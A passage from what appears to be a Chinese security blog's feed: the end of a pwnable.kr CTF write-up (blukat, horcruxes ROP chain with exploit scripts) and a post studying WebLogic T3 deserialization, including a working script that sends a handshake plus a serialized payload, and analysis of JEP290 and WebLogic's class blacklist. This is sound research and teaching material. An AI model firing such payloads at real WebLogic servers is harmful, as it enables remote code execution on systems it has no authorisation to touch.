punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>…脑洞题，password为<code>cat: password: Permission denied</code>，就是为了提醒注意文件权限</p><h3 id="解题-19"><a href="#解题-19" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'blukat'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/blukat/blukat"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat: password: Permission denied"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="21-horcruxes"><a href="#21-horcruxes" class="headerlink" title="21. horcruxes"></a>21. horcruxes</h2><h3 id="题目-20"><a href="#题目-20" class="headerlink" title="题目"></a>题目</h3><p>需要<code>sudo apt install libseccomp-dev:i386</code></p><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>有个名为 ropme 的函数，主要关注这里，其功能判断输入值是否为 sum，是的话则返回 flag<br>可以明显看到数组<code>s</code>有溢出，但是怎么利用呢？</p><ol><li>直接控制 ropme 返回地址到 open flag 的地址</li><li>获取 a~g 的变量值通过 sum 验证</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921305968734.jpg" alt="-w469"></p><p>首先检查看到是没有开启 ASLR 地址是固定利用的，接着往下走</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921446659641.jpg" alt="-w307"></p><p>第一种方法中，由于跳转地址含有<code>0x0a</code>导致无法有效从 gets 输入，所以只能考虑第二种方法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921431564969.jpg" alt="-w469"></p><p>我们看到 A~G 函数都是无参函数，且执行 printf 后 ret 返回，所以在栈上表现为返回执行原函数下一地址指令</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921433549736.jpg" alt="-w474"></p><p>我们通过把栈覆盖如下，当输入不等于 sum 时，ropme 即会跳转调用 A 函数输出 a，当从 A 函数返回时便会调用 B 函数……当 A~G 都执行完毕后计算 sum 值，再次调回 ropme 输入正确答案即可</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921442969783.jpg" alt="-w304"></p><h3 id="解题-20"><a href="#解题-20" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>is_remote <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9032</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/horcruxes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'.'</span> <span class="token operator">*</span> <span class="token number">0x78</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe4b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># A</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># B</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe89</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># C</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fea8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># D</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fec7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># E</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fee6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># F</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809ff05</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># G</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fffc</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ropme</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> int<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">')\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum <span class="token operator">+=</span> nump<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">LINUX SYSTEM CALL TABLE FOR X86 64</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linux程序的常用保护机制</a></li><li><a href="http://0x4c43.cn/2017/1024/linux-memory-management-and-heap/" target="_blank" rel="noopener">Linux 内存管理与堆</a></li><li><a href="https://segmentfault.com/a/1190000005118060" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a></li><li><a href="https://segmentfault.com/a/1190000005183474" target="_blank" rel="noopener">Linux堆内存管理深入分析（下）</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/" target="_blank" rel="noopener">深入理解堆的实现</a></li><li><a href="https://www.bilibili.com/video/av200358962/" target="_blank" rel="noopener">从栈溢出开始，教你写Shellcode和ROP链</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没更新，菜鸡学 pwn&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="https://blog.sari3l.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 协议学习</title>
    <link href="https://blog.sari3l.com/posts/ecb4dfa2/"/>
    <id>https://blog.sari3l.com/posts/ecb4dfa2/</id>
    <published>2020-04-01T08:16:44.000Z</published>
    <updated>2020-07-06T09:45:06.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-to-Implement-WebLogic-RMI"><a href="#How-to-Implement-WebLogic-RMI" class="headerlink" title="How to Implement WebLogic RMI"></a>How to Implement WebLogic RMI</h2><p>首先构造 rmi 服务端，以便观察数据包</p><p>根据<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI146" target="_blank" rel="noopener">官方文档</a>，直接生成 jar 包</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852292974954.jpg" alt="-w775"></p><p>将生成的jar包放到测试domain的lib目录下</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293246061.jpg" alt="-w752"></p><p>将目标<code>server</code>类配置为启动类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293730424.jpg" alt="-w988"></p><p>重启 weblogic 后即可进行调用</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852294460930.jpg" alt="-w666"></p><h2 id="流量解析"><a href="#流量解析" class="headerlink" title="流量解析"></a>流量解析</h2><p>红色部分为 request<br>蓝色部分为 response</p><p>P.S. 此节当时用了12.1.3.0.0版本，本文其他内容均为12.2.1.4.0版本</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852305401102.jpg" alt="-w1120"></p><p>通过<code>ac ed 00 05</code>筛选出请求反序列化部分依次为</p><pre class=" language-plain"><code class="language-plain">weblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.JVMIDweblogic.rjvm.JVMID---weblogic.rjvm.ClassTableEntryweblogic.rjvm.ImmutableServiceContext---weblogic.rjvm.ImmutableServiceContext</code></pre><h2 id="T3-协议利用"><a href="#T3-协议利用" class="headerlink" title="T3 协议利用"></a>T3 协议利用</h2><p>根据数据包请求内容，我们主体需要分为两部分进行发送</p><ol><li><p>握手🤝</p><pre class=" language-plain"><code class="language-plain"> t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n</code></pre></li><li><p>序列化数据</p><p> 这里涉及两种方式，实际上也算是同一种</p><ol><li><p>将上面提到的序列化部分其中一项改为恶意 payload</p></li><li><p>取消所有序列化部分，在下面数据后直接拼接恶意 payload</p><pre><code>000005fe016501ffffffffffffffff000000710000ea60000000184f0fb5416958bf21f2810099d59af6a410012655b1f4c837027973720078720178720278700000000c00000002000000000000000400000001007070707070700000000c00000002000000000000000400000001007006fe010000</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852751007483.jpg" alt="-w647"></p></li></ol></li></ol><p>最简单的情况当然是后者，下面是利用脚本，注意头 4 字节为数据总长度</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        server <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Handshake</span>        handshake <span class="token operator">=</span> b<span class="token string">"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending: %s"</span> <span class="token operator">%</span> handshake<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Send Payload</span>        Obj <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> b<span class="token string">"\x00\x00\x05\xfe\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x0f\xeb\x30\x46\x27\x2d\x8c\xc7\x52\x16\xbb\xd1\x9e\x42\x00\xdc\x6a\x8e\x80\xbe\xbb\x7e\xd5\xbe\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00"</span>        payload <span class="token operator">+=</span> Obj        payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print("[*] Sending Payload: %s" % payload)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending Payload ..."</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %s"</span> <span class="token operator">%</span> e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python t3protocol.py 127.0.0.1 7001 payload.bin"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="T3-解析过程"><a href="#T3-解析过程" class="headerlink" title="T3 解析过程"></a>T3 解析过程</h2><p>为了下断点，先将 src.zip 加入到 Classpath 中</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853030550115.jpg" alt="-w662"></p><pre class=" language-plain"><code class="language-plain">readObject:71, BadAttributeValueExpException (javax.management)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invokeReadObject:1158, ObjectStreamClass (java.io)readSerialData:2173, ObjectInputStream (java.io)readOrdinaryObject:2064, ObjectInputStream (java.io)readObject0:1568, ObjectInputStream (java.io)readObject:428, ObjectInputStream (java.io)readObject:73, InboundMsgAbbrev (weblogic.rjvm)read:45, InboundMsgAbbrev (weblogic.rjvm)readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)init:219, MsgAbbrevInputStream (weblogic.rjvm)dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)readReadySocketOnce:993, SocketMuxer (weblogic.socket)readReadySocket:929, SocketMuxer (weblogic.socket)process:599, NIOSocketMuxer (weblogic.socket)processSockets:563, NIOSocketMuxer (weblogic.socket)run:30, SocketReaderRequest (weblogic.socket)execute:43, SocketReaderRequest (weblogic.socket)execute:147, ExecuteThread (weblogic.kernel)run:119, ExecuteThread (weblogic.kernel)</code></pre><p>具体过程可见<a href="https://www.anquanke.com/post/id/201432#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201432#h2-3</a><br>不再赘述</p><h2 id="过滤机制"><a href="#过滤机制" class="headerlink" title="过滤机制"></a>过滤机制</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a><a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a></h3><blockquote><p>JEP290主要描述了这么几个机制：</p><ol><li>提供一个限制反序列化类的机制，白名单或者黑名单</li><li>限制反序列化的深度和复杂度</li><li>为RMI远程调用对象提供了一个验证类的机制</li><li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853581669600.jpg" alt="-w499"></p><h3 id="1-filterCheck-in-JDK"><a href="#1-filterCheck-in-JDK" class="headerlink" title="1. filterCheck in JDK"></a>1. filterCheck in JDK</h3><p>我们通过在8u151版本下实现RMI，并尝试用cc3反序列化来查看机制如何进行过滤</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853596960053.jpg" alt="-w617"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853599930145.jpg" alt="-w715"></p><p>跟入 checkInput，serialFilter为<code>sun.rmi.registry.RegistryImpl</code>对象，所以实际进入到<code>rt.jar!sun.rmi.registry.RegistryImpl#registryFilter</code>进行过滤</p><p>可以看到对深度、数组大小和基本类型做了判断</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853607916582.jpg" alt="-w925"></p><p>以及最后的这段</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Proxy<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UnicastRef<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIClientSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>RMIServerSocketFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ActivationID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>UID<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">?</span> Status<span class="token punctuation">.</span>REJECTED <span class="token operator">:</span> Status<span class="token punctuation">.</span>ALLOWED<span class="token punctuation">;</span></code></pre><p>直接禁用了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，所以返回了<code>Status.REJECTED</code></p><hr><p>“JSON反序列化之殇_看雪安全开发者峰会”的时序图</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855538532354.jpg" alt></p><h3 id="2-Weblogic-without-JEP290"><a href="#2-Weblogic-without-JEP290" class="headerlink" title="2. Weblogic without JEP290"></a>2. Weblogic without JEP290</h3><p>通过上面在 JDK 中的抵用栈信息，可以看到在 weblogic 中是通过<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>进入的<code>java.io.ObjectInputStream</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854721866812.jpg" alt="-w951"></p><p>我们跟进ServerChannelInputStream看一下</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854737021432.jpg" alt="-w1344"></p><p>再看一下<code>ServerChannelInputStream</code>的继承关系</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854751893169.jpg" alt="-w626"></p><p>即<code>ServerChannelInputStream</code>继承自FilteringObjectInputStream，并通过重写resolveClass、resolveProxyClass从而进行反序列化过滤防御</p><p>我们跟进checkLegacyBlacklistIfNeeded看一下，到这<code>weblogic.utils.io.oif.WebLogicObjectInputFilter#checkLegacyBlacklistIfNeeded</code>会根据是否支持JEP290自带过滤，在不可用情况下会使用<code>isBlacklistedLegacy</code>进行防御</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854755062154.jpg" alt="-w781"></p><p>至于哪里调用JEP290过滤先放一边，我们先看下isBlacklistedLegacy</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854757085240.jpg" alt="-w786"></p><p>如果类名第一个字符为<code>[</code>（数组），或为primitiveTypes中的某项，就不会进行检测</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854758262158.jpg" alt="-w1124"><br>之后会检查类型类名、包名是否在LEGACY_BLACKLIST中，有一项不符即回到上面抛出异常</p><p>我们看看LEGACY_BLACKLIST是怎么来的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854765156752.jpg" alt="-w917"></p><p>跟进<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>可以发现 BLACKLIST 取决于constructLegacyBlacklist方法，考虑上下文追溯至<code>processLegacyBlacklistProperties</code>，因为我们考虑的是不支持 JEP290 的情况，所以进入到最后的 else 分支中</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854767314187.jpg" alt="-w1201"></p><p>所以 BLACKLIST 来源主要来自以下三处</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_PACKAGES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.apache.commons.collections.functors"</span><span class="token punctuation">,</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax"</span><span class="token punctuation">,</span> <span class="token string">"javassist"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.activation"</span><span class="token punctuation">,</span> <span class="token string">"sun.rmi.server"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.builder"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.reader"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.proxy"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.metadata"</span><span class="token punctuation">,</span> <span class="token string">"org.jboss.interceptor.spi.model"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.aop.aspectj.annotation"</span><span class="token punctuation">,</span> <span class="token 